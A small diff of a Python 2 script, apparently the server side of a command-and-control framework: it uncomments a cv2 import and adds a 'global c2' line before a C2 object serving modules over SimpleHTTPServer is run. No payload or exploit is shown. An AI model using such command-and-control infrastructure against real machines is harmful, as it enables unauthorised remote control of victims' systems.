@@ -24,7 +24,7 @@ import collections
 import multiprocessing
 
 # packages
-# import cv2
+import cv2
 import colorama
 import SocketServer
 
@@ -121,6 +121,7 @@ def main():
     globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
 
+    global c2
     c2.run()
 
 
